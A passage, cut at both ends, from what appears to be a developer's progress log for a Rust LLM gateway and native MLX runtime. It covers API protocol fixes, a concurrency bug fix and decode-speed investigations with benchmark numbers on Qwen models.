  to guard it; kept a small env-gated per-token profiler. master `b9ef3d5`. (No
  streaming detokenizer needed — left in BACKLOG only if a future tokenizer is slow.)
- [x] gateway-cc-codex-audit — DONE (synthetic pass, 2026-06-13). Launched `rozum gateway`
  + Qwen3-4B and drove the wire protocol. **Core is solid for both dialects:** OpenAI
  `/v1/chat/completions` (non-stream JSON + stream SSE `role→deltas→finish_reason→[DONE]` +
  tool-use `tool_calls`/`finish_reason:"tool_calls"`), Anthropic `/v1/messages` (full SSE
  `message_start→content_block_start→content_block_delta→content_block_stop→message_delta
  {stop_reason}→message_stop` + non-stream JSON + tool-use `tool_use`/`input_json_delta`),
  `/v1/models`, stop-reason mapping (length↔max_tokens, tool_calls), validation→HTTP 422.
  The gateway's own banner targets CC (`ANTHROPIC_BASE_URL`) + Codex (`OPENAI_BASE_URL`).
  Findings → fixes below. (Still worth a LIVE pass with real CC/Codex for client-specific
  quirks; needs the user to point them at the endpoint.)
- [x] gateway-cc-codex-fixes — DONE (3 fixed, 1 not-a-bug):
  - [x] **tool-call-xml-format** — FOUND in the tool-use pass + FIXED (master `8c29870`),
    the most impactful. Qwen3.6 emits tool calls in EITHER `<tool_call>{json}</tool_call>`
    OR the Hermes `<tool_call><function=NAME><parameter=K>V</parameter>…</function></tool_call>`
    form, nondeterministically. `parse_tool_calls` only handled JSON → the XML calls were
    SILENTLY LOST (text suppressed by `<tool_call>`, parse fails → empty response) — a
    showstopper for agentic coding. Now parses both forms + tolerates a missing close tag
    + never swallows tokens (raw-text fallback). Verified read→write_file 5/5 OpenAI + 3/3
    Anthropic. (Underlying greedy MoE nondeterminism between the two formats is a separate,
    model-level quirk; the parser now handles both so it doesn't matter.)
  - [x] **stream-default** — FIXED (master `b4c6501`). `req.stream.unwrap_or(true)` → `false`
    in both handlers + debug logs; an absent `stream` now returns non-streaming JSON (spec).
    Verified live (omit `stream` → `chat.completion` JSON); gateway lib tests 14/0. `rozum
    launch` only exports env (no requests), CC/Codex set `stream:true` explicitly → unaffected.
  - [x] **models-id** — NOT A BUG. The `claude-rozum-<spec>` id is intentional
    (`claude_model_alias`): `rozum launch` exports it as `ANTHROPIC_MODEL` so CC pre-selects
    the local model instead of the default OAuth one. Request `model` is ignored (one loaded
    model). No change.
  - [x] **think-passthrough** — FIXED via option (c), made a launch flag (user's call:
    "disable by default"). The native backend renders the chat template with
    `enable_thinking=false` by DEFAULT, so a reasoning model (Qwen3) prefills a closed
    `<think></think>` in the PROMPT and the generated OUTPUT is clean (no think tags at all,
    not even the empty `/no_think` wrapper). A new `rozum gateway --enable-thinking` flag (or
    `ROZUM_ENABLE_THINKING`) turns reasoning back on. Threaded `enable_thinking: Option<bool>`
    through `ApplyChatTemplateArgs`→minijinja `context!` (fork `4978c2d4`). Verified e2e:
    default → no `<think>`; `--enable-thinking` → `<think>`. master `550f970`.

#### P1 (NEXT): meeting-room-reliability — solid "agents + human operator" room

**Sprint goal #1.** `meeting/` + the rozum MCP server exist. Harden the live flow.
- [x] meeting-reliability-audit — DONE. Mapped the failure modes; found ONE real bug
  (below). Verified-handled: **disconnect/crash cleanup** (`app.rs` spawn_connection:
  `service.waiting()` returns on socket EOF → auto-leave → clears participant + responding/
  polling markers); **stale markers** (responding/polling filtered at read time ~30s + cleared
  on submit/leave, existing tests); **concurrent submits** (serialized by the meeting `Mutex`,
  seq-ordered; "anyone submits any time" by design — no turn lock to corrupt); **wakeup-channel
  vs long-poll** (long-poll is seq-based off the transcript, so a missed broadcast still
  recovers on the next poll). idle-model-unload doesn't touch meetings (rooms are independent
  of the gateway model).
- [x] **meeting-reliability-fixes** — lost-wakeup in `wait_my_turn` FIXED (master `0c85de5`).
  `post_submission` wakes pollers with `notify_waiters()` (stores NO permit), but `wait_my_turn`
  created `notify.notified()` AFTER its transcript check — a submit landing between the check
  and the `.await` was lost, stalling the poller until the 25s deadline (~25s latency on a
  message). Fix: arm the `Notified` (pin + `enable()`) BEFORE the check; kept `notify_waiters`
  (wake-all, since N agents poll concurrently — `notify_one` would wake only one). Regression
  test `wait_my_turn_wakes_on_submit` (poller must return ≪25s on submit). All 23 meeting tests pass.

#### P2: mlx-prealloc-kv — pre-allocated KV cache ✅ DONE (2026-06-13)

`ConcatKeyValueCache` now pre-allocates the key/value buffers in `KV_STEP`(256)-blocks
along the sequence axis and writes each step in place via `slice_update`, returning a
`[:offset]` view — instead of `concatenate`-ing (+ reallocating) the whole history every
decode step (mirrors `mlx_lm`'s `KVCache`). The O(ctx) per-step copy → amortised O(1)
write (one growth concat / 256 steps). **Decode byte-exact** (greedy IDs unchanged, all
chat tests pass, fast lib suite 118/0); decode t/s flat across ctx 64→1024. Chunked-vs-
single prefill stays argmax-exact (~1 bf16 ulp from the strided-slice SDPA when the
single-pass length isn't step-aligned; gate relaxed 1e-2→0.2 with an inline explanation).
Fork `d197d1da`, rozum master `c7ffa5c`. (As expected, no headline-speed change — the
concat was already flat in the ctx sweep; the win is constant-memory KV growth for long
sessions + no realloc churn.) Next: **P0.1 gateway-prod-perf-verify** (runtime).

---
#### (record) P0 RESOLVED: mlx-native-perf-compile — close the decode-speed gap to Python

**✅ RESOLVED (2026-06-12, merged to master).** The hybrid (Qwen3.6) decode gap is
the gated_delta per-call eval, and its ROOT CAUSE is MLX's **unretained
command-buffer references** (`commandBufferWithUnretainedReferences`): a buffer
feeding the custom kernel is freed/reused before the in-flight GPU dispatch reads it
→ garbage from token 2; the per-call eval was a ~48-sync/token workaround. FIX:
env-gated **retained refs** (`ROZUM_MLX_RETAIN`) applied via a `PATCH_COMMAND` on the
MLX FetchContent (mlx-c fork), enabled by the backend for hybrid models only;
gated_delta then drops the per-call eval. **27B decode ~12 → ~16-17 t/s (+30-40%)**,
byte-identical output; dense models unaffected. Forks pushed
(`sergey-scherbina/mlx-c` @ rozum-retain-0.30.6, `sergey-scherbina/mlx-rs` @
rozum-hybrid-decode); rozum pinned to mlx rev `09c5b20d`. Full investigation +
bottom-up Python↔Rust log + patch: `docs/mlx-gd-bug/`. Bumping MLX does NOT help
(master/0.31.2 still unretained); a per-op buffer-lifetime difference vs `mlx_lm`
(which is correct serially on the same MLX) remains a curiosity but is not needed.
The "mx.compile / capture-based" plan below was the wrong lever (probed, dead end);
kept for the record.

#### P1 (follow-up): mlx-native-decode-gap-remainder — re-scoped: gap is REAL; MoE is the big one

**Status: OPEN, re-measured CLEAN 2026-06-12. The "structural FFI overhead" verdict was
WRONG, and the gap is bigger on the MoE than the dense.**

**⚠ METHODOLOGY: kill the Bloop/ScalaCli Java daemon before benchmarking.** It held
**17.9 GB / 38.7**, and unified-memory contention throttles Python HARDER than Rust →
the gap *fakes parity* under pressure (dense Python 15.5 vs Rust 14.4 = 1.08×, false).
`ps -A -o rss,comm | sort -rn | head` → `kill <java pid>` (respawns on demand) → re-bench.
A whole "we're at parity" detour came from benchmarking under this contamination.

**CLEAN numbers (Bloop killed), Qwen3.6-4bit, n=512 prefill + 64 decode:**
| model | Rust (retain) | Py manual | Py `generate` | decode gap | prefill gap |
|---|---|---|---|---|---|
| Dense 27B   | 16.2 t/s | 19.8 | **23.0** | **1.4×** | 170 vs 194 (1.14×) |
| MoE 35B-A3B | 33.4 t/s | 97.3 | **110.9**| **3.3×** | 584 vs 1180 (2.0×) |
Output IDs byte-identical Rust↔Python on both. **The MoE 3.3× is the real prize**, not
the dense 1.4×. (Note: MoE 33 t/s is already faster than dense 16 — usable; this is a
parity-with-Python goal, not a usability blocker.)

**The gap is in `eval` (GPU dispatch), NOT mlx-rs FFI/binding.** Instrumented split,
Rust MoE decode: `build` (FFI node construction in `forward()`) = **2.4 ms/tok (8%)**;
`eval` (graph traverse + Metal dispatch + GPU) = **28.7 ms/tok (92%)**. `eval` is shared
C++ → our op GRAPH dispatches more / less-efficient GPU work than Python's for identical
math. So the fix is leaner/fewer GPU dispatches, not a faster binding.

**Levers:**
- [x] decode-gap-measure - DONE, corrected: dense 16.2 vs 23.0 (1.4×); MoE 33.4 vs 110.9
  (3.3×). Earlier "17 vs 22.8 structural FFI" was cross-session machine-state contamination.
- [x] decode-gap-031 - DONE: version is not a lever.
- [x] decode-gap-compile - TESTED net-NEGATIVE (compute_g via mlx-rs compile: 16.5→15.8).
- [x] decode-gap-pipeline - TESTED ~neutral on both models clean (dense 15.9→16.2, MoE
  32.1→33.4). Not the lever.
- [x] decode-gap-ffi-vs-eval - DONE: build=8%, eval=92% → NOT FFI overhead; it's GPU-side.
- [x] decode-gap-kvcache - RULED OUT for decode: `ConcatKeyValueCache` does an O(ctx) concat
  per step but the context sweep is FLAT (Rust 32.7→30.9 t/s ctx 128→1024). Not this gap.
  (Still worth a pre-alloc cache for very long contexts — separate concern.)
- [x] **moe-prefill-sort** - DONE, SHIPPED. Ported Python `SwitchGLU` expert sort
  (`_gather_sort`/`_scatter_unsort` + `sorted_indices=true` into `gather_qmm` when
  `indices.size>=64`) in `qwen3_moe.rs` `SwitchGlu`/`QSwitchLinear` (shared by qwen3_moe +
  qwen3_5_moe). **Qwen3.6-35B-A3B-4bit prefill 584 → ~1020 tok/s (n=512, ~1.7×)** toward
  Python's 1180; decode unchanged (no sort at T=1); byte-exact (decode IDs identical), both
  MoE chat tests pass. Fork `sergey-scherbina/mlx-rs` @ rozum-hybrid-decode `4ec9bc86`;
  rozum (feature/mlx-hybrid-decode) Cargo pinned to it, reproducible git-rev build verified.
- [x] **moe-decode-dispatch** - ROOT-CAUSED & FIXED (**MoE decode 33 → ~83 t/s, 2.5×**).
  Added `mlx_export_to_dot` (mlx-c) + rust wrapper + a `ROZUM_DUMP_DOT` bench branch, and
  counted graph primitives per T=1 token: **Rust 4366 vs Python 2610**, with **1269 `AsType`
  (dtype casts) in Rust vs ~0 in Python**. Traced them: ~1000 fed QuantizedMatmul/GatherQMM,
  casting the bf16 quantized scales/biases up — because **the activation stream was f32**.
  Root cause: `GatedDeltaNet` (qwen3_5.rs) scaled q/k by `Array::from_f32(inv_scale)` — a
  STRONG f32 0-dim array → promoted the whole stream bf16→f32 at the 1st GDN layer (Python
  multiplies by a python float, stays bf16). Fix: scale by a scalar cast to q/k's dtype.
  Byte-exact (greedy IDs identical, all chat tests pass). Prims 4366→3307 (AsType 1269→210),
  decode 33→83, **prefill 943→~1200 (= Python 1180)**. Shared GDN → dense 27B too. Fork
  `8739cf72` (mlx-c `d71809d`), rozum `5dc7bd0`, reproducible git-rev build verified.
  The earlier "2.4× super-additive eval" was this: the f32 stream's extra casts scaled with
  graph size. FOLLOW-UP DONE: `rms_norm_no_weight` (null-weight fast kernel; mlx-c allowed it,
  mlx-rs wrapper didn't) replaced the per-call ones weight → prims 3307→3127 (Full 60→0),
  **MoE decode ~83→~88 t/s**, dense ~19→~19.6; byte-exact. Fork `0d4b3729`, rozum `4f31ecc`.
  Remaining tail: Rust 3127 vs Python 2610 — the leftover 150 AsType + extra Multiply/Broadcast
  are `compute_g` / gate f32 math that Python fuses via `mx.compile` (mlx-rs compile is
  net-negative). MoE ~88 vs Python 97/110; dense ~19.6 vs 23. Diminishing — needs hand-fused
  Metal kernels or a lower-overhead mlx-rs compile.
- [x] dense-decode-dispatch - RESOLVED end-to-end. The bf16 fix took the bench 16.2→~19, but
  the bench's own argmax/clone/eval loop UNDER-measures ~10-15%: through the real prod
  `backend.chat` (pipelined) **dense Qwen3.6-27B = 22.5 t/s = Python parity (23)**, MoE ~99-100
  (= Python). So effectively NO prod decode gap on either model. The synthetic engine-bench
  tail (88 vs 97) is the BACKLOG fusion item but doesn't show end-to-end. Verified by
  `mlx_dense_backend_chat_tps` / `mlx_moe_backend_chat_tps` (TTFT prefill-bound: dense ~2.5s,
  MoE ~1.2-1.7s/520tok; concurrency serialized via the single MLX worker thread).

Diagnostics on branch `feature/mlx-hybrid-decode`: Rust benches `mlx_qwen35_prefill_bench`
(dense) / `mlx_qwen35_moe_decode_bench` (MoE; `ROZUM_CTXSWEEP=1` env) — run with
`ROZUM_MLX_RETAIN=1`. Python: `docs/mlx-gd-bug/py/decode_bench.py <repo>` (`CTXSWEEP=1` env).
Per-block skip hatches (`ROZUM_SKIP_MOE`/`ROZUM_SKIP_ATTN` in qwen3_5_moe DecoderLayer) were
used for the localization above and reverted; re-add to reproduce.

**Don't block other work on this** — usable speeds today; this is parity-chasing.

**(historical goal) native MLX decode ~12 t/s → ~22 t/s (Python `mlx_lm` parity).**
Full analysis: `docs/specs/mlx-native-runtime.md` → "mx.compile" + the
"Performance — capture-based compile plan" section.

**The problem (root cause, settled).** Decode is **per-call op-launch / FFI-overhead
bound** — ~450 tiny matmul/conv dispatches per token at T=1; each is an FFI call +
lazy-graph build. NOT bandwidth-bound (~27 t/s ceiling), NOT missing fusion (rms_norm
/ rope / sdpa fast kernels already used). Python hits ~22 because `mx.compile` turns
the whole forward into ONE traced graph (weights captured, only token+cache crosses
FFI per step).

**The lever.** A **capture-based plain `compile`** of the decode step (`compile.rs:344`
marshals only `args`, captures weights into the trace — like Python), NOT
`compile_with_state` (re-marshals ~400 params/call → the net-negative my old
`mlx_compile_probe` measured). **Prereq: a fixed-shape KV cache** (preallocate to
max-ctx + in-place slice-update + offset; today's `ConcatKeyValueCache` grows by
concat → shape changes → recompile every token). **Risk:** must stay byte-exact; the
GatedDeltaNet custom kernel must stay OUT of the compiled region (compile + in-place
cache + buffer-donating kernel = the token-2 divergence hazard).

**Stages.**
- [x] **Stage 0 — probe (de-risk first). DONE — NO-GO signal (`sunny-civet`, 2026-06-22).**
  Ran the existing `mlx_compile_probe_plain` (`mlx_native_backend.rs:5076`, plain `compile`,
  weights captured) on Qwen3-0.6B-4bit: **compiled is SLOWER** — T=1 `0.69×` (26.6→38.4 ms),
  T=16 `0.58×` (19.7→33.9 ms). Plain-compile of the decode step does **not** pay off at this
  scale; matches the prior `compile_with_state` net-negative and [[project-mlx-hybrid-decode-gap]]
  ("compile doesn't win, batching was the lever"). **Decision: do NOT build Stage 1/2 on this
  premise.** Caveats (so it's a signal, not absolute): the probe uses the growing
  `ConcatKeyValueCache` (not yet the proposed fixed-shape cache) and 0.6B (not the 27B target);
  the *only* thing that could still flip it is a probe on 27B WITH the fixed-shape cache — but
  given two net-negative compile results, that is a deliberate, slot-heavy bet, not a default.
  Recommend keeping single-stream perf on the shipped batching lever.
- [x] **Stage 1 — fixed-shape KV cache** — ON-ICE (parent perf-compiled-decode NO-GO).
- [x] **Stage 2 — compiled decode step** — ON-ICE (parent perf-compiled-decode NO-GO).
- [x] **Stage 3 — clean A/B on 27B** — ON-ICE (parent perf-compiled-decode NO-GO).

**⚠ RESUME CHECKPOINT — read this first after any reboot, then continue.**
The machine has rebooted from memory pressure mid-experiment before; this block is the
single source of truth to pick up "as if nothing happened". Update it after every
meaningful step and commit (small, frequent commits — never hold uncommitted experiment
state).

**ACTIVE NOW (2026-06-12): MLX 0.31.2 bump for hybrid — NEGATIVE RESULT, settled.
Awaiting the Python-oracle decode number, then revert the bump.**

**⛔ THE BUMP DOES NOT FIX THE HYBRID. The premise was false.** The plan was:
bump MLX 0.30.6→0.31.2 → the GatedDeltaNet buffer-donation bug disappears → drop the
per-call eval → hybrid pipelines → ~22 t/s. Every link broke under test:

1. **0.31.2 does NOT fix the donation hazard.** Clean rebuild from scratch
   (`cargo clean -p mlx-sys --release` → 2m06s full C++ compile, fetched-src
   `git describe`=v0.31.2): `ROZUM_GD_NO_EVAL=1 mlx_qwen35_chat` → **garbage `)`,
   identical to 0.30.6.** eval-ON → `Here's a thinking process:` (byte-exact, as always).
   - ⚠ **STALE-BUILD MIRAGE LESSON:** an *incremental* 21s relink after the GIT_TAG bump
     showed no-eval = coherent `Here\n\n\n</think>` — a LIE. Incremental builds don't
     recompile `libmlx.a`; a 0.30.6/0.31.2 ABI mix gave lucky-looking garbage. **After
     any mlx-c/CMake version bump you MUST `cargo clean -p mlx-sys` before trusting
     runtime behavior.** The clean build is the only truth.
2. **The per-call eval is genuinely mandatory for the metal_kernel path** on both
   versions (the buffer-donation hazard is real and version-independent for our kernel).
3. **The pure-ops path (`ROZUM_GD_OPS=1`, `gated_delta_ops`) is donation-safe with ZERO
   eval** → correct output. So the bug is specific to the custom metal_kernel primitive,
   not the math. (mlx-rs `MetalKernel::new` uses `ensure_row_contiguous=true, atomic=false`
   — faithful to Python defaults, so the wrapper isn't the difference.)
4. **Pipelining does NOT help hybrid — it's compute-bound, not readback-bound.** Bench
   on 27B-4bit (`mlx_qwen35_prefill_bench`):
   ```
                       decode serial   pipelined     prefill
     kernel+eval n=128     12.3          14.3       119 tok/s
     kernel+eval n=1024    13.3          11.1       147 tok/s   (pipeline HURTS)
     ops no-eval n=128     15.0          16.3        92 tok/s
     ops no-eval n=1024    13.1          12.2        85 tok/s   (pipeline HURTS)
   ```
   The dense pipelining win (96.5% of Python) came from filling the per-token readback
   bubble; the hybrid forward (GatedDeltaNet recurrence × 48 layers) has **no idle-GPU
   bubble** → nothing to fill. Dropping the eval (ops path) buys ~20% at short context
   and **vanishes/reverses by n=1024** — exactly the contexts a coding agent runs at.
   And ops wrecks prefill (85 vs 147 tok/s). **Hybrid decode ≈ 13 t/s regardless of
   eval / pipelining / MLX version.**

**CONCLUSION on the bump:** the 0.31.2 bump buys nothing for the hybrid goal and carries
the fft.cpp-disable + ops.cpp `global_scale`-nullopt patches as pure maintenance debt.
**Revert it.** Keep **kernel+eval** for hybrid (correct; best prefill).

**⭐ THE REAL GAP IS FOUND — and it is NOT the bump. Python is ~1.8× faster.** Oracle
measured (2026-06-12, `/tmp/mlxoracle`, mlx 0.31.2 + mlx_lm 0.31.3, same 27B-4bit):
```
  Python mlx_lm  decode = 23.1 tok/s   (prompt 32 t/s, peak 15.4 GB)
  our kernel+eval decode ≈ 12–13 tok/s        → ~1.8× gap, REAL
```
So 13 t/s is NOT the ceiling. Ruled out as the cause: eval (our ops no-eval path = ~15,
still far from 23), pipelining (hurts us), MLX version (both on 0.31.2).

**THE CRUX (next agent: start here).** Python runs the **same `gated_delta` metal_kernel
with NO per-call eval** and is correct; ours needs the 48-syncs/token eval or it's garbage
`)`. That eval is ~the 1.8×. **Why does our identical kernel need the eval when Python's
doesn't?** Python source read (`/private/tmp/mlxoracle/.../mlx_lm/models/`):
- `gated_delta.py:171 gated_delta_kernel` — builds the kernel output, **returns lazy, no
  eval**. Same `GATED_DELTA_SOURCE`, same wrapper (`ensure_row_contiguous=true,atomic=false`).
- `qwen3_5.py:183-197` — `out, state = gated_delta_update(...)`; `cache[1] = state` (stores
  the **lazy** state); `cache.advance(S)`. Uses `ArraysCache` (`cache.py`), NOT our
  `ConcatKeyValueCache`. Conv state: `cache[0] = mx.contiguous(conv_input[:, -n_keep:, :])`
  (note the explicit `mx.contiguous`, qwen3_5.py:166).
**Concrete hypotheses to test (cheapest first, all small-model-probeable):**
  1. **`T` passed as Array vs scalar.** Ours (`gated_delta.rs:226`) passes
     `&t_scalar = Array::from_int(t)` — an MLX **Array** (runtime buffer). Python passes a
     raw **int** `T` → MLX templates it as a constant. mlx-rs `MetalKernel::apply` only
     takes `&[impl AsRef<Array>]` (no scalar path) → forces T to a buffer → possibly
     different/garbage codegen only masked by the eval. **Check if mlx-rs/mlx-c exposes a
     scalar-input path for metal_kernel; if not, add one.** Most promising lead.
  2. **State contiguity / dtype.** Python stores a contiguous state; ours may hand the
     kernel a non-contiguous cache slice that aliases under donation. Try
     `state.contiguous()` (or `+0`) before/after the kernel WITHOUT eval.
  3. **Cache structure.** Port Python's `ArraysCache` (lazy-state store + `advance`) for
     hybrid instead of `ConcatKeyValueCache`; the in-place store may keep the state
     buffer concrete across later layers.
- **If kernel-no-eval is made correct → expect ~23 t/s (kernel speed + no syncs).** That's
  the whole prize. Validate byte-exact greedy vs the oracle each step.
- **Oracle env stays at `/tmp/mlxoracle`** (reuse it; rerun
  `HF_HUB_OFFLINE=1 python -m mlx_lm generate --model mlx-community/Qwen3.6-27B-4bit
  --prompt "..." --max-tokens 64 --temp 0` for fresh numbers). 27B run = memory-heavy,
  ~15.4 GB peak; gate on `memory_pressure` (was 90% free), one run at a time.

**Repo state (NOT merged):** rozum worktree `feature/mlx-031-bump` (Cargo.toml = path-deps
to fork); fork `.vendor/mlx-lm` branch `mlx-0.31.2-bump` (GIT_TAG v0.31.2 @ CMakeLists.txt:38;
fft.cpp disabled @:55; ops.cpp 3 quantize calls patched w/ `std::nullopt` global_scale;
gated_delta.rs:252 `ROZUM_GD_NO_EVAL` gate). 0.30.6 baseline = prior fork branch
`rozum-mlx-native` @ d62049c9. **The lib is currently built clean against 0.31.2.**
**To revert the bump:** point rozum's Cargo.toml/git-pin back at `rozum-mlx-native`
(0.30.6), drop the `feature/mlx-031-bump` + `mlx-0.31.2-bump` branches (or keep them
parked, documented as a closed negative experiment).

- **Memory discipline (this is what caused the reboots):** probe/iterate on the
  SMALLEST model (`mlx-community:Qwen3-0.6B-4bit`, cached), NOT 27B. Check
  `memory_pressure` before any model load; if free < ~25%, stop and free first. Only
  use 27B for a final A/B.
- **DENSE decode SOLVED & merged (pipelining):** `stream_generation` pipelines (build +
  `async_eval` the next token before blocking on the current) for dense arches
  (Qwen3, Qwen3-MoE, Llama, Qwen2 — `pipeline=true`); hybrid (Qwen3.6) keeps the serial
  path (`pipeline=false`) — **and per the bench above, that is correct: pipelining hurts
  hybrid, so do NOT flip the hybrid arms.** Probe `mlx_decode_pipeline_probe`: 4B
  **114→128 t/s = 96.5% of Python's 132.9**.
- **(historical) compile + cache levers — both ruled out.**
- **Results so far (2026-06-12):**
  - `mlx_compile_probe_plain` on Qwen3-0.6B-4bit (thread-local model + plain
    `compile`, weights captured, only token marshaled):
    `T=1 uncompiled 3.137ms vs compiled 4.541ms (0.69×); T=16 1.00×`.
    → **Plain `compile` is ALSO not a win.** So the decode gap is NOT a compile
    problem. (Makes sense: compile fuses elementwise glue, NOT the matmul GEMMs that
    dominate a transformer's ~450 dispatches.) **This rules out the fixed-cache +
    compiled-decode redesign as the lever — big save.**
  - **RE-PROBED 2026-06-14 on a 7× bigger model (Qwen3-4B-4bit) — still net-NEGATIVE:**
    `T=1 uncompiled 9.633ms vs compiled 15.053ms (0.64×); T=16 0.92×`. The hypothesis
    "compile wins once build is expensive" is **refuted**: the slowdown does NOT shrink
    with model size — mlx-rs's `compile` *adds* per-call overhead that exceeds the build
    it saves, independent of build cost. So the Python `mx.compile` win (token+cache only
    crossing FFI, trace reused) does **not** translate to the mlx-rs binding; getting it
    would require fixing mlx-rs `compile` / calling mlx-c compile directly (deep, uncertain
    upstream work). The post-bf16-fix MoE decode is build/FFI-bound (92%), but that build
    is **not reducible via mlx-rs compile** — `mlx-native-perf-compile` is a confirmed
    dead end for now. (Note: the original "eval=92% GPU" framing was pre-bf16-fix; post-fix
    the split flips to build=92% — but compile still can't capture it.)
  - The probe used a FRESH cache, so it didn't measure the cache cost. Confirmed
    `ConcatKeyValueCache::update_and_fetch` does `concatenate_axis` EVERY step
    (`cache.rs:95`) → O(n) realloc+copy per token, vs Python's preallocated in-place
    KVCache. BUT the old bench was ~flat across 128/512/1024 context (~13/12/12 t/s),
    which argues concat is NOT the dominant cost at ≤1024 either.
- **LEVER FOUND = PIPELINING (`async_eval`).** Read `mlx_lm/generate.py:455-470`:
  Python builds step n+1's graph from the *lazy* token n and `mx.async_eval`s it
  BEFORE `y.item()` on token n — GPU never idles waiting for the CPU to build the next
  graph. Our `stream_generation` (line ~570) does `eval`+`item` (blocking) THEN builds
  the next step → a sync bubble every token.
  - `mlx_decode_pipeline_probe` on Qwen3-4B-4bit: **serial 114.2 t/s, pipelined
    128.3 t/s (1.12×)**. Python `mlx_lm` same model = **132.9 t/s**. So pipelined =
    **96.5% of Python** (serial was 86%). **Pipelining closes the gap.** Win scales
    with how much CPU graph-build hides behind GPU compute → bigger on 27B (more
    layers, where the serial gap was 12 vs 22 = 55%).
- **Next concrete step:** implement pipelining in the REAL decode loop
  (`stream_generation`): hold the current lazy token, build+`async_eval` the next
  before reading the current. Then (a) byte-exact check the dense e2e tests
  (`mlx_chat_capital_of_france`, `mlx_qwen2_chat`, `mlx_llama_chat`) — tokens must be
  identical; (b) **carefully** test the HYBRID path (qwen3_5 27B) — the GatedDeltaNet
  custom kernel needs a per-call `eval` (buffer-donation hazard); async_eval deferral
  may re-trigger the token-2 garbage. If hybrid breaks, gate pipelining to non-kernel
  (dense) arches, or force the kernel's state eval inside the loop.
- mx.compile + fixed-cache redesign: **shelved** (probe showed compile is not the
  lever; the cache concat is ~flat across context). Pipelining is simpler and wins.

#### P0 (current): mlx-native-runtime — pure-Rust native MLX runtime

Run MLX-community checkpoints through a **full native MLX forward** (no candle,
no Python, no subprocess) built on the upstream `oxideai/mlx-lm` Rust crate
(scaffolding + Qwen3 dense + Llama already done). Gives MLX's real wins (fusion,
no cross-runtime sync, day-one architectures) in one binary, and **retires
`mlx_lm.server`**. Supersedes both `mistralrs-mlx-direct` (bridge = structural
perf dead end) and the from-scratch `mlx-native-port`.

Spec: `docs/specs/mlx-native-runtime.md`. Branch: `feature/mlx-native`.
Decisions locked: vendor-fork `.vendor/mlx-lm` · broad catalog · top-of-chain
(retire mlx_lm.server) · build on the crate, port only missing models · forward
is 100% MLX, candle only as external oracle.

- [x] mlx-native-p0 - Phase 0 dense: **DONE** (Qwen3-4B-4bit correct + fast).
  - **AFQ load fixed** (3 upstream gaps: config quantization, single-file,
    `.inner.weight` key remap) -> 904/904 params load.
  - **Forward bug #1 FIXED** (`1bbe6e52`): dead KV cache (slots init'd None ->
    decode ran cache-less, repetition). Fix: `Some(C::default())`.
  - **Forward bug #2 FIXED**: mlx-rs `nn::Rope::forward` reshaped to 3D
    `[-1, L, head_dim]`; for decode (L=1) the `[B*n_heads, 1, head_dim]` shape
    trips an MLX fast-rope bug rotating only head 0, leaving later heads
    un-rotated -> garbage. Fix: RoPE on the 4D shape directly (like Python).
    **NOT the cause** (each cost real time): MLX version (0.31.2 reproduces it),
    mask, sinks, layout, device, SDPA. The 0.31.2 bump was done (mlx-c fft/ops
    patched to build) but didn't fix it -> reverted to 0.30.6 (rope fix is
    version-independent, keeps the submodule unpatched).
  - **Result:** Qwen3-4B-4bit byte-identical to mlx_lm ("The capital of France
    is Paris"), **~106 T/s** (> candle ~100, ~10x bridge). Native-MLX thesis
    fully proven (fast AND correct).
- [x] mlx-native-p0b - `MlxNativeBackend` wired into the gateway (`b25497c`).
  - MLX is `!Send` (one Metal stream) -> a dedicated worker thread owns the
    model for life, loads it itself, serves jobs off a channel, streams
    `ChatEvent`s back; the backend is a thin Send+Sync handle. Chat-template
    render (system/user/assistant/tool), EOS/max-tokens/cancel stop, UTF-8-safe
    incremental detokenize (holds a trailing replacement char so mid-Cyrillic
    never leaks). `concurrency_capacity()=1` -> `admit_wrap` gates it.
  - `mlx-native` feature (off by default) + path deps on the vendored fork
    (swap to a git-rev pin at merge, like mistralrs). `build_gateway_backend`
    tries it before mistralrs for MLX checkpoints.
  - E2E test through the real SPI: streams a correct "Paris" answer in ~3.7s
    incl. load. `cargo check --features mlx-native` + fmt + lib suite clean.
  - Merged `origin/master` (the generic `concurrency` admission decorator +
    shared-gateway) into the branch; clean.
  - Gaps still open: hf-hub auto-download; sampler top_p/top_k/rep-penalty
    (Generate only takes temp today); tool-use streaming; EOS list from config.
- [x] mlx-native-p1 - Phase 1: port `qwen3_moe`; gated on `Qwen3-30B-A3B-4bit`.
  - Dense Qwen3 attention reused verbatim; sparse MoE MLP = router gate
    (quantized Linear) -> softmax -> argpartition top-8 -> `take_along_axis`
    scores -> `SwitchGLU` experts via `gather_qmm` -> weighted sum. Experts are
    AFQ 3D `[E,out,in]` raw `Param<Array>`; target-aware load remap adds
    `.inner.weight` only where that param exists (QuantizedLinear leaves) so the
    experts keep `.weight`. Token-sort skipped (gather_qmm identical sorted/not).
  - **Greedy byte-for-byte identical to Python `mlx_lm`** on Qwen3-30B-A3B-4bit:
    `<think>\n\n</think>\n\nThe capital of France is Paris.` Loads 1351 params,
    full load+gen in ~4.6s. Backend dispatches qwen3/qwen3_moe by `model_type`
    via a `LoadedModel` enum + shared generic streaming loop. (Downloaded the
    gate model, ~17GB.) E2E test `mlx_moe_chat_capital`.
  - All 48 layers sparse (mlp_only=[]); dense MoE layers fail loud for now.
- [x] mlx-native-p2 - Phase 2: port `qwen3_5` (27B dense) + `qwen3_5_moe`
  (35B-A3B) hybrid; gate on cached `Qwen3.6-{27B,35B-A3B}-4bit`. Headline: the
  models the user runs, pure-Rust. Qwen3-Next family,
  the hard phase — COMPLETE. Scope mapped from Python `qwen3_5`/`qwen3_next`/`gated_delta`:
  - **DONE (fork `364cebf6`):** the GatedDeltaNet delta-rule recurrence
    (`models/gated_delta.rs`, ops path — mlx-rs has no custom-kernel support, so
    O(T) prefill but byte-exact). Unit-test validated vs Python `gated_delta_ops`
    (<1e-3 on a seed-0 case). compute_g + delta_step + sequential scan.
  - **Phase 2a DONE — `qwen3_5` (Qwen3.6-27B) byte-exact** (fork `9df1dd15`,
    rozum `b39a49c`). `models/qwen3_5.rs`: output-gated full attention (every 4th
    layer; q_proj->queries+gate, `o_proj(out*sigmoid(gate))`, partial RoPE
    rotary_dim=head_dim*0.25 — mRoPE keys ignored for text, confirmed correct) +
    GatedDeltaNet linear layers (depthwise `Conv1d` + causal conv-state cache +
    the f32 delta scan) + heterogeneous `LayerCache::{Full(KV), Linear{conv,state}}`
    + RMSNormGated + weightless q/k rms_norm. Backend `Qwen35` arm; jinja template
    fallback; sharded-no-index load; `language_model.` prefix strip (skip vision
    tower); config under `text_config` (rope from nested `rope_parameters`).
    **Bugs found+fixed during bring-up** (localized via per-layer L2 dumps vs a
    Python oracle): the mlx-community 4bit checkpoint is already sanitized so the
